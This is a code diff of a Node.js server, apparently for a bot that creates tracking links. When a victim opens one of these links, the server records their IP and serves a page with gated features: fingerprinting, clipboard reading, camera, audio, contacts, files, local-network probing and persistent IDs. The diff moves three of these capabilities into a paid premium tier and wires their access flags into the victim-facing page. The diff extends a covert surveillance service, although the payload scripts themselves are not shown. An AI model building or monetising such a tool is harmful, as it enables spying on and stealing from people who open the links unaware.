@@ -20,8 +20,8 @@ const USERSTATS_FILE  = "./userstats.json";
 const PROFILES_FILE   = "./profiles.json";
 const PREMIUM_FILE    = "./premium.json";
 
-const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true, clipboard:true, persistentId:true, localNet:true, webpush:true };
-const DEFAULT_PREMIUM_FREE = { camera:false, audio:false, clipboard:false, contacts:false, files:false };
+const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true, clipboard:true };
+const DEFAULT_PREMIUM_FREE = { camera:false, audio:false, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:false };
 
 let users      = new Set(loadJSON(USERS_FILE, []));
 let banned     = new Set(loadJSON(BANNED_FILE, []));
@@ -367,10 +367,13 @@ async function handleLinkOpen(req, res, view) {
 
   const feat = settings.features || DEFAULT_FEATURES;
   const userPremium = isPremium(creatorId);
-  const camAccess  = canUsePremium(creatorId, 'camera');
-  const audioAccess= canUsePremium(creatorId, 'audio');
-  const clipAccess = canUsePremium(creatorId, 'clipboard');
-  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat, premium: userPremium, camAccess, audioAccess, clipAccess });
+  const camAccess      = canUsePremium(creatorId, 'camera');
+  const audioAccess   = canUsePremium(creatorId, 'audio');
+  const clipAccess    = canUsePremium(creatorId, 'clipboard');
+  const pidAccess     = canUsePremium(creatorId, 'persistentId');
+  const localNetAccess= canUsePremium(creatorId, 'localNet');
+  const pushAccess    = canUsePremium(creatorId, 'webpush');
+  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat, premium: userPremium, camAccess, audioAccess, clipAccess, pidAccess, localNetAccess, pushAccess });
 }
 
 app.get("/w/:path/*",  (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "webview"); });
@@ -1090,11 +1093,14 @@ const FEAT_NAMES = {
 
 // ── Premium Config Menu ───────────────────────────────────────────────────────
 const PREM_FEAT_NAMES = {
-  camera:    "📷 الكاميرا",
-  audio:     "🎤 الصوت",
-  clipboard: "📋 الحافظة",
-  contacts:  "📒 جهات الاتصال",
-  files:     "🖼️ الصور/الملفات"
+  camera:      "📷 الكاميرا",
+  audio:       "🎤 الصوت",
+  clipboard:   "📋 الحافظة",
+  contacts:    "📒 جهات الاتصال",
+  files:       "🖼️ الصور/الملفات",
+  persistentId:"🆔 المعرّف الدائم",
+  localNet:    "🌐 الشبكة المحلية",
+  webpush:     "🔔 الإشعارات"
 };
 
 function premiumConfigText() {
